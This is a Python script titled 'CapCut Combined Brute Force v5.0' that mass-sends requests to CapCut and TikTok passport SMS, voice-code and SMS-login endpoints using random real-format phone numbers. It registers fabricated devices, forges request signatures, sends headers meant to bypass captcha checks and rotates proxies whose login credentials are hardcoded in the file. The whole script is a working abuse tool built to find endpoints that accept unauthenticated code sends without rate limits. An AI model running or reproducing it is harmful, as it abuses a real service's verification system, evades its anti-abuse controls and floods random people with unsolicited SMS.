#!/usr/bin/env python3
"""
CapCut Combined Brute Force v5.0
=================================
Phase A: CapCut DEDICATED passport hosts (passport-api.capcut.com, passport-api.capcutapi.com, etc.) × ALL AIDs
Phase B: CapCut sub-API hosts (api.capcut.com, api-sg.capcut.com, api-va.capcutapi.com, api-us-looki, etc.) × ALL AIDs
Phase C: NEW endpoints (org/send_code, sms_login_continue, email/login, etc.) on known working hosts
Phase D: Verify + expand findings

CapCut APK Analysis (com.lemon.lvoverseas v17.7.0, versionCode 17700200):
- 190 passport endpoints, 34 API hosts, 138 domains, 57 headers
- NEW: passport-api.capcut.com, passport-api.capcutapi.com, tt-passport16-normal-sg.capcutapi.com
"""

import asyncio
import aiohttp
import json
import random
import time
import hashlib
import uuid
from urllib.parse import urlencode
from dataclasses import dataclass, field
from typing import Dict, List

PROXY_TEMPLATE = "http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080"
REGIONS = ["AU", "DE", "SG", "FR", "GB", "NL", "JP", "CA"]
TIMEOUT = aiohttp.ClientTimeout(total=15)

try:
    import SignerPy as SP
    SIGNER_OK = True
except ImportError:
    SIGNER_OK = False
    print("WARNING: SignerPy not available")


def gen_phone():
    prefixes = [("+61", 9), ("+49", 10), ("+65", 8), ("+33", 9), ("+44", 10),
                ("+1", 10), ("+92", 10), ("+91", 10), ("+81", 10), ("+82", 10),
                ("+86", 11), ("+66", 9), ("+62", 11), ("+852", 8)]
    prefix, digits = random.choice(prefixes)
    num = ''.join(str(random.randint(1 if i == 0 else 0, 9)) for i in range(digits))
    return f"{prefix}{num}"


def encrypt_phone(phone):
    return ''.join(format(ord(c) ^ 5, '02x') for c in phone)


def get_proxy(region=None):
    return PROXY_TEMPLATE.format(region=region or random.choice(REGIONS))


@dataclass
class Stats:
    total: int = 0
    success: int = 0
    rate_limited: int = 0
    no_perms: int = 0
    errors: int = 0
    html: int = 0
    not_found: int = 0
    email_format: int = 0
    other: int = 0
    findings: List[Dict] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock, repr=False)

    def reset(self):
        self.total = self.success = self.rate_limited = self.no_perms = 0
        self.errors = self.html = self.not_found = self.email_format = self.other = 0
        self.findings = []
        self.start_time = time.time()

    async def record(self, cat, detail=None):
        async with self._lock:
            self.total += 1
            setattr(self, cat, getattr(self, cat, 0) + 1)
            if detail and cat in ("success", "rate_limited", "email_format"):
                self.findings.append(detail)

    def summary(self):
        elapsed = time.time() - self.start_time
        rps = self.total / elapsed if elapsed > 0 else 0
        return (f"total={self.total} suc={self.success} rl={self.rate_limited} "
                f"ec16={self.no_perms} 404={self.not_found} email={self.email_format} "
                f"err={self.errors} html={self.html} other={self.other} "
                f"time={elapsed:.0f}s rps={rps:.1f}")


stats = Stats()

# ============================================
# CAPCUT DEDICATED PASSPORT INFRASTRUCTURE (NEW!)
# ============================================
CAPCUT_PASSPORT_HOSTS = [
    "passport-api.capcut.com",                      # NEW dedicated CapCut passport
    "passport-api.capcutapi.com",                   # NEW
    "passport-api-va-us-looki.capcutapi.com",       # NEW US-looki passport
    "passport-api-v2-boot.capcutapi.com",           # NEW v2 boot passport
    "tt-passport16-normal-sg.capcutapi.com",        # NEW TikTok-style passport on CapCut!
]

CAPCUT_API_HOSTS = [
    "api.capcut.com",
    "api-sg.capcut.com",
    "api.capcutapi.com",
    "api-va.capcutapi.com",
    "api-us-looki.capcutapi.com",
    "api-va-us-looki.capcutapi.com",
    "api-resource.capcutapi.com",
    "us.capcut.com",
    "feed-api.capcut.com",
    "feed-api-sg.capcut.com",
    "editor-api.capcut.com",
    "editor-api-va.capcutapi.com",
    "general-api-us-looki.capcutapi.com",
    "commerce-api.capcutapi.com",
    "commerce-api-v2-boot.capcutapi.com",
]

CAPCUT_TIKTOKV_HOSTS = [
    # tiktokv.com hosts found in CapCut APK
    "api16-core-c-alisg.tiktokv.com",
    "api22-core-c-alisg.tiktokv.com",
    "api-boot.tiktokv.com",
    "api-core-boot.tiktokv.com",
    "inapp.tiktokv.com",
]

# ============================================
# ALL AIDS (33 — including 4 NEW from Lemon8 brute force)
# ============================================
ALL_AIDS = {
    1233: ("TikTok Global", "musical_ly", "com.zhiliaoapp.musically"),
    1340: ("TikTok Lite", "trill", "com.zhiliaoapp.musically.go"),
    3006: ("CapCut", "vicut", "com.lemon.lvoverseas"),
    1180: ("Helo", "musical_ly", "com.zhiliaoapp.musically"),
    2658: ("Lemon8/BD2658", "musical_ly", "com.zhiliaoapp.musically"),
    2657: ("BD 2657", "musical_ly", "com.zhiliaoapp.musically"),
    7743: ("BD 7743", "musical_ly", "com.zhiliaoapp.musically"),
    2239: ("BD 2239", "musical_ly", "com.zhiliaoapp.musically"),
    259: ("BD 259", "musical_ly", "com.zhiliaoapp.musically"),
    473824: ("BD 473824 (TikTok APK)", "musical_ly", "com.zhiliaoapp.musically"),
    567753: ("BD 567753 (TikTok APK)", "musical_ly", "com.zhiliaoapp.musically"),
    1988: ("Douyin Web", "douyin_web", "douyin_web"),
    1459: ("TikTok Web", "tiktok_web", "tiktok_web"),
    1583: ("TikTok Ads", "tiktok_web", "tiktok_web"),
    1128: ("Douyin", "aweme", "com.ss.android.ugc.aweme"),
    1112: ("Huoshan", "live_stream", "com.ss.android.ugc.live"),
    1319: ("Pipix", "super", "com.sup.android.superb"),
    2329: ("Douyin Lite", "aweme_lite", "com.ss.android.ugc.aweme.lite"),
    32: ("Xigua Video", "video_article", "com.ss.android.article.video"),
    13: ("Toutiao", "news_article", "com.ss.android.article.news"),
    1760: ("BD 1760", "musical_ly", "com.zhiliaoapp.musically"),
    2960: ("BD 2960", "musical_ly", "com.zhiliaoapp.musically"),
    4068: ("BD 4068", "musical_ly", "com.zhiliaoapp.musically"),
    4143: ("BD 4143", "musical_ly", "com.zhiliaoapp.musically"),
    4174: ("BD 4174", "musical_ly", "com.zhiliaoapp.musically"),
    5049: ("BD 5049", "musical_ly", "com.zhiliaoapp.musically"),
    6027: ("BD 6027", "musical_ly", "com.zhiliaoapp.musically"),
    6556: ("BD 6556", "musical_ly", "com.zhiliaoapp.musically"),
    6849: ("BD 6849", "musical_ly", "com.zhiliaoapp.musically"),
    8311: ("BD 8311", "musical_ly", "com.zhiliaoapp.musically"),
    4370: ("Lemon8 (Official)", "nproject", "com.bd.nproject"),
    7135340: ("CapCut OAuth (NEW from APK!)", "vicut", "com.lemon.lvoverseas"),
}

TYPE_CODES = [3635, 3532, 3637, 3634, 3734, 3733, 3731, 3536, 3132, 3631, 3632]

# NEW endpoints from CapCut APK (not previously tested)
NEW_ENDPOINTS = [
    "/passport/mobile/send_code/v1/",       # standard
    "/passport/mobile/send_code/",          # without v1
    "/passport/web/send_code/",             # web
    "/passport/mobile/can_send_voice_code/",
    "/passport/mobile/send_voice_code/",
    "/passport/mobile/sms_login/",          # NEW family
    "/passport/mobile/sms_login_only/",     # NEW
    "/passport/mobile/sms_login_continue/", # NEW from CapCut!
    "/passport/mobile/can_chain_login/",    # NEW family
    "/passport/mobile/chain_login/",        # NEW
    "/passport/email/send_code/",           # email
    "/passport/web/email/send_code/",       # web email
]

BRANDS = {
    "samsung": ["SM-S918B", "SM-S911B", "SM-A546B"],
    "Google": ["Pixel 8 Pro", "Pixel 7"],
    "OnePlus": ["IN2020", "NE2210"],
    "Xiaomi": ["2201117TG", "23078RKD5C"],
}
ANDROIDS = ["12", "13", "14"]
API_LEVELS = {"12": "31", "13": "33", "14": "34"}
BUILD_IDS = ["UP1A.231005.007", "TP1A.220624.014", "TQ3A.230705.001"]


def gen_device():
    brand = random.choice(list(BRANDS.keys()))
    model = random.choice(BRANDS[brand])
    av = random.choice(ANDROIDS)
    return {
        "brand": brand, "model": model, "android_version": av,
        "api_level": API_LEVELS[av], "build_id": random.choice(BUILD_IDS),
        "resolution": random.choice(["1080*2400", "1080*2340"]),
        "dpi": random.choice(["420", "480"]),
        "openudid": ''.join(random.choices('0123456789abcdef', k=16)),
        "cdid": str(uuid.uuid4()),
        "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
    }


async def register_device(session, domain, aid, app_name, package, proxy=None):
    dev = gen_device()
    ts = int(time.time())
    vc = "350804"
    vn = "35.8.4"
    params = urlencode({
        "aid": str(aid), "app_name": app_name, "version_code": vc, "version_name": vn,
        "device_platform": "android", "os": "android",
        "os_api": dev["api_level"], "os_version": dev["android_version"],
        "device_type": dev["model"], "device_brand": dev["brand"],
        "language": "en", "ac": "wifi", "channel": "googleplay",
        "resolution": dev["resolution"], "dpi": dev["dpi"],
        "openudid": dev["openudid"], "cdid": dev["cdid"],
        "ts": str(ts), "_rticket": str(ts * 1000),
    })
    body = json.dumps({
        "magic_tag": "ss_app_log",
        "header": {
            "display_name": app_name, "update_version_code": int(vc),
            "manifest_version_code": int(vc), "aid": aid, "channel": "googleplay",
            "package": package, "app_version": vn, "version_code": int(vc),
            "sdk_version": "2.14.0-rc.8", "os": "Android",
            "os_version": dev["android_version"], "os_api": int(dev["api_level"]),
            "device_model": dev["model"], "device_brand": dev["brand"],
            "device_manufacturer": dev["brand"], "cpu_abi": "arm64-v8a",
            "density_dpi": int(dev["dpi"]), "display_density": "xxhdpi",
            "resolution": dev["resolution"].replace("*", "x"),
            "language": "en", "timezone": 0, "access": "wifi",
            "cdid": dev["cdid"], "sig_hash": "aea615ab", "openudid": dev["openudid"],
            "clientudid": str(uuid.uuid4()), "region": "US",
        },
        "_gen_ts": ts,
    })
    url = f"https://{domain}/service/2/device_register/?{params}"
    ua = f"{package}/{vc} (Linux; U; Android {dev['android_version']}; en_US; {dev['model']}; Build/{dev['build_id']})"
    try:
        async with session.post(url, data=body,
                                headers={"Host": domain, "User-Agent": ua, "Content-Type": "application/json"},
                                proxy=proxy, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status == 200:
                data = await resp.json()
                return {"device_id": str(data.get("device_id", "")),
                        "iid": str(data.get("install_id", "")), "dev": dev}
    except Exception:
        pass
    return None


def sign_req(url_params, body, cookie_str, aid):
    if SIGNER_OK:
        return SP.sign(params=url_params, payload=body, cookie=cookie_str, version=8404, aid=aid)
    ts = str(int(time.time()))
    return {"x-gorgon": hashlib.md5(f"{url_params}{ts}".encode()).hexdigest()[:20] + "00000000",
            "x-khronos": ts, "x-argus": "", "x-ladon": "",
            "x-ss-stub": hashlib.md5(body.encode()).hexdigest().upper()}


async def _classify(data, detail):
    msg = data.get("message", "")
    ec = data.get("data", {}).get("error_code", data.get("error_code", -1))
    if msg == "success":
        detail["type"] = "SUCCESS"
        await stats.record("success", detail)
        print(f"\n*** SUCCESS *** AID={detail['aid']} dom={detail['domain']} ep={detail['endpoint']} tc={detail['tc']} phase={detail['phase']}")
    elif ec in (7, 1206):
        detail["type"] = "RATE_LIMITED"
        await stats.record("rate_limited", detail)
    elif ec == 16:
        await stats.record("no_perms")
    elif ec == 1031:
        detail["type"] = "EMAIL_FORMAT"
        await stats.record("email_format", detail)
    else:
        await stats.record("other")


async def test_web(session, sem, domain, endpoint, aid, tc, app_name, proxy, phase):
    async with sem:
        phone = gen_phone()
        body = urlencode({"mobile": encrypt_phone(phone), "type": str(tc), "aid": str(aid),
                          "app_name": app_name, "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0"})
        url = f"https://{domain}{endpoint}?aid={aid}&app_name={app_name}"
        headers = {"Host": domain, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
                   "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json",
                   "Origin": f"https://{domain}", "X-SS-DP": str(aid),
                   "x-tt-bypass-bdturing": "1", "x-tt-cmpl-token": "", "x-tt-cipher-version": "1"}
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False, timeout=TIMEOUT) as resp:
                if resp.status == 404: await stats.record("not_found"); return
                text = await resp.text()
                if not text.strip().startswith("{"): await stats.record("html"); return
                await _classify(json.loads(text), {"aid": aid, "domain": domain, "tc": tc,
                    "app_name": app_name, "endpoint": endpoint, "method": "web", "phone": phone, "phase": phase})
        except Exception:
            await stats.record("errors")


async def test_signed(session, sem, domain, endpoint, aid, tc, app_name, package, proxy, phase, reg_domain=None):
    async with sem:
        phone = gen_phone()
        encrypted = encrypt_phone(phone)
        ts = int(time.time())
        rticket = str(ts * 1000 + random.randint(1000, 9999))
        rd = reg_domain or "api16-normal-c-useast2a.tiktokv.com"
        dev_info = await register_device(session, rd, aid, app_name, package, proxy)
        if not dev_info:
            dev_info = {"device_id": str(random.randint(10**15, 10**16-1)),
                        "iid": str(random.randint(10**15, 10**16-1)), "dev": gen_device()}
        dev = dev_info["dev"]
        vc = "350804"
        body = urlencode({"mobile": encrypted, "type": str(tc), "aid": str(aid), "app_name": app_name,
                          "auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35", "mix_mode": "1",
                          "is6Digits": "1", "check_register": "1", "multi_login": "1"})
        url_params = urlencode({"aid": str(aid), "app_name": app_name, "version_code": vc,
                                "device_id": dev_info["device_id"], "iid": dev_info["iid"],
                                "device_platform": "android", "os_version": dev["android_version"],
                                "device_type": dev["model"], "device_brand": dev["brand"],
                                "language": "en", "ac": "wifi", "channel": "googleplay",
                                "openudid": dev["openudid"], "cdid": dev["cdid"],
                                "ts": str(ts), "_rticket": rticket})
        cookie = f"sessionid=; install_id={dev_info['iid']}; store-country-code=us; odin_tt={dev['odin_tt']}"
        sigs = sign_req(url_params, body, cookie, aid)
        ua = f"{package}/{vc} (Linux; U; Android {dev['android_version']}; en_US; {dev['model']}; Build/{dev['build_id']})"
        headers = {"Host": domain, "Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "X-SS-DP": str(aid), "User-Agent": ua, "Accept-Encoding": "gzip, deflate",
                   "x-tt-bypass-dp": "1", "x-tt-dm-status": "login=0;ct=0;rt=7",
                   "x-tt-store-region": random.choice(["au", "de", "sg", "us", "gb"]),
                   "x-tt-store-region-src": "did", "x-tt-bypass-bdturing": "1",
                   "x-tt-cmpl-token": "", "x-tt-cipher-version": "1",
                   "x-tt-app-init-region": random.choice(["US", "AU", "DE", "SG"]),
                   "X-Gorgon": sigs.get("x-gorgon", ""), "X-Khronos": sigs.get("x-khronos", str(ts)),
                   "X-Argus": sigs.get("x-argus", ""), "X-Ladon": sigs.get("x-ladon", ""),
                   "X-SS-STUB": sigs.get("x-ss-stub", "")}
        url = f"https://{domain}{endpoint}?{url_params}"
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False, timeout=TIMEOUT) as resp:
                if resp.status == 404: await stats.record("not_found"); return
                if resp.status == 403: await stats.record("other"); return
                text = await resp.text()
                if not text.strip().startswith("{"): await stats.record("html"); return
                await _classify(json.loads(text), {"aid": aid, "domain": domain, "tc": tc,
                    "app_name": app_name, "endpoint": endpoint, "method": "signed",
                    "phone": phone, "phase": phase, "device_id": dev_info["device_id"]})
        except Exception:
            await stats.record("errors")


async def run_batch(tasks, phase_name):
    total = len(tasks)
    print(f"Testing {total:,} combos...")
    batch = 500
    for i in range(0, total, batch):
        await asyncio.gather(*tasks[i:i+batch], return_exceptions=True)
        elapsed = time.time() - stats.start_time
        rps = stats.total / elapsed if elapsed > 0 else 0
        print(f"\r[{phase_name}] {stats.total:,}/{total:,} | SUC:{stats.success} RL:{stats.rate_limited} "
              f"ec16:{stats.no_perms} 404:{stats.not_found} err:{stats.errors} | {rps:.0f} req/s", end="", flush=True)
    print(f"\n{phase_name}: {stats.summary()}")
    return stats.findings[:]


async def phase_a():
    print("\n" + "="*80)
    print("PHASE A: CAPCUT DEDICATED PASSPORT HOSTS × ALL 33 AIDs")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(300)
    conn = aiohttp.TCPConnector(limit=400, limit_per_host=30, ssl=False)

    endpoints = ["/passport/mobile/send_code/v1/", "/passport/mobile/send_code/",
                 "/passport/web/send_code/", "/passport/mobile/can_send_voice_code/"]

    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for host in CAPCUT_PASSPORT_HOSTS:
            for aid, (name, app_name, package) in ALL_AIDS.items():
                for ep in endpoints:
                    for tc in [3635, 3532]:
                        proxy = get_proxy(random.choice(["AU", "DE", "SG", "US"]))
                        if "web" in ep:
                            tasks.append(test_web(session, sem, host, ep, aid, tc, app_name, proxy, f"phA-{host.split('.')[0]}"))
                        else:
                            tasks.append(test_signed(session, sem, host, ep, aid, tc, app_name, package, proxy,
                                                      f"phA-{host.split('.')[0]}"))
        findings = await run_batch(tasks, "Phase A")
    with open("/home/ubuntu/capcut_phA.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings


async def phase_b():
    print("\n" + "="*80)
    print("PHASE B: CAPCUT SUB-API HOSTS (api.capcut.com, api-sg, api-va, etc.) × ALL AIDs")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(300)
    conn = aiohttp.TCPConnector(limit=400, limit_per_host=30, ssl=False)

    endpoints = ["/passport/web/send_code/", "/passport/mobile/send_code/v1/",
                 "/passport/mobile/send_code/"]

    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for host in CAPCUT_API_HOSTS + CAPCUT_TIKTOKV_HOSTS:
            for aid, (name, app_name, package) in ALL_AIDS.items():
                for ep in endpoints:
                    tc = random.choice([3635, 3532, 3634])
                    proxy = get_proxy()
                    if "web" in ep:
                        tasks.append(test_web(session, sem, host, ep, aid, tc, app_name, proxy, f"phB-{host.split('.')[0]}"))
                    else:
                        tasks.append(test_signed(session, sem, host, ep, aid, tc, app_name, package, proxy,
                                                  f"phB-{host.split('.')[0]}"))
        findings = await run_batch(tasks, "Phase B")
    with open("/home/ubuntu/capcut_phB.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings


async def phase_c():
    print("\n" + "="*80)
    print("PHASE C: NEW ENDPOINTS (sms_login_continue, can_chain_login, chain_login) × CAPCUT + KNOWN")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(250)
    conn = aiohttp.TCPConnector(limit=400, limit_per_host=30, ssl=False)

    new_only = [
        "/passport/mobile/sms_login_continue/",
        "/passport/mobile/can_chain_login/",
        "/passport/mobile/chain_login/",
    ]
    test_hosts = (CAPCUT_PASSPORT_HOSTS + CAPCUT_API_HOSTS[:6] + [
        "api16-normal-c-useast2a.tiktokv.com",
        "api16-normal-v6.tiktokv.com",
        "us.tiktok.com",
        "www.tiktok.com",
    ])
    test_aids = [3006, 1233, 1340, 1180, 2658, 7743, 2239, 1583, 1988]

    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for host in test_hosts:
            for aid in test_aids:
                _, app_name, package = ALL_AIDS[aid]
                for ep in new_only:
                    for tc in [3635, 3532]:
                        proxy = get_proxy()
                        if any(h in host for h in ("capcut", "tt-passport")):
                            # CapCut hosts — try both web and signed
                            tasks.append(test_web(session, sem, host, ep, aid, tc, app_name, proxy, f"phC-cap-{host.split('.')[0]}"))
                            tasks.append(test_signed(session, sem, host, ep, aid, tc, app_name, package, proxy, f"phC-cap-{host.split('.')[0]}"))
                        elif host.endswith(".tiktok.com") or "useast2a" in host:
                            # known web hosts
                            tasks.append(test_web(session, sem, host, ep, aid, tc, app_name, proxy, f"phC-{host.split('.')[0]}"))
                            if "useast2a" in host or "v6" in host:
                                tasks.append(test_signed(session, sem, host, ep, aid, tc, app_name, package, proxy, f"phC-{host.split('.')[0]}"))
        findings = await run_batch(tasks, "Phase C")
    with open("/home/ubuntu/capcut_phC.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings


async def phase_d(all_findings):
    print("\n" + "="*80)
    print("PHASE D: VERIFY & EXPAND CAPCUT FINDINGS")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(200)
    conn = aiohttp.TCPConnector(limit=300, limit_per_host=30, ssl=False)

    verifiable = [f for f in all_findings if f.get("type") != "EMAIL_FORMAT"]
    if not verifiable:
        print("No findings to verify!")
        return []

    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for f in verifiable:
            aid = f["aid"]
            domain = f["domain"]
            ep = f["endpoint"]
            tc = f["tc"]
            method = f.get("method", "web")
            app_name = f.get("app_name", "musical_ly")
            info = ALL_AIDS.get(aid, ("", app_name, "com.zhiliaoapp.musically"))
            package = info[2]

            # Re-test in 3 fresh regions
            for region in random.sample(REGIONS, 3):
                proxy = get_proxy(region)
                if method == "web":
                    tasks.append(test_web(session, sem, domain, ep, aid, tc, app_name, proxy, "phD-verify"))
                else:
                    tasks.append(test_signed(session, sem, domain, ep, aid, tc, app_name, package, proxy, "phD-verify"))

            # Expand: try this AID on additional CapCut hosts
            for ed in random.sample(CAPCUT_PASSPORT_HOSTS + CAPCUT_API_HOSTS[:5], 4):
                for etc in random.sample([3635, 3532, 3637, 3634, 3734, 3733], 3):
                    proxy = get_proxy()
                    if method == "web":
                        tasks.append(test_web(session, sem, ed, ep, aid, etc, app_name, proxy, "phD-expand"))
                    else:
                        tasks.append(test_signed(session, sem, ed, ep, aid, etc, app_name, package, proxy, "phD-expand"))

        findings = await run_batch(tasks, "Phase D")
    with open("/home/ubuntu/capcut_phD.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings


async def main():
    print("="*80)
    print("CAPCUT COMBINED BRUTE FORCE v5.0")
    print(f"SignerPy: {'OK' if SIGNER_OK else 'MISSING'}")
    print(f"Total AIDs: {len(ALL_AIDS)}")
    print(f"CapCut passport hosts: {len(CAPCUT_PASSPORT_HOSTS)}")
    print(f"CapCut API hosts: {len(CAPCUT_API_HOSTS) + len(CAPCUT_TIKTOKV_HOSTS)}")
    print("="*80)

    t0 = time.time()
    all_findings = []

    fa = await phase_a()
    all_findings.extend(fa)
    fb = await phase_b()
    all_findings.extend(fb)
    fc = await phase_c()
    all_findings.extend(fc)
    fd = await phase_d(all_findings)
    all_findings.extend(fd)

    elapsed = time.time() - t0
    print("\n" + "="*80)
    print(f"ALL PHASES COMPLETE — {elapsed:.0f}s total")

    seen = set()
    unique = []
    for f in all_findings:
        key = (f.get("aid"), f.get("domain"), f.get("endpoint"), f.get("tc"), f.get("type"))
        if key not in seen:
            seen.add(key)
            unique.append(f)

    successes = [f for f in unique if f["type"] == "SUCCESS"]
    rl = [f for f in unique if f["type"] == "RATE_LIMITED"]
    ef = [f for f in unique if f["type"] == "EMAIL_FORMAT"]

    print(f"Unique: {len(unique)} | SUCCESS: {len(successes)} | RL: {len(rl)} | EMAIL: {len(ef)}")
    print("\nSUCCESSES:")
    for f in successes:
        print(f"  AID={f['aid']} dom={f['domain']} ep={f['endpoint']} tc={f['tc']} method={f.get('method')}")

    with open("/home/ubuntu/capcut_combined_results.json", "w") as fp:
        json.dump({"total_time": elapsed, "unique": len(unique),
                   "successes": successes, "rate_limited": rl, "email_format": ef}, fp, indent=2)
    print(f"\nResults: /home/ubuntu/capcut_combined_results.json")


if __name__ == "__main__":
    asyncio.run(main())
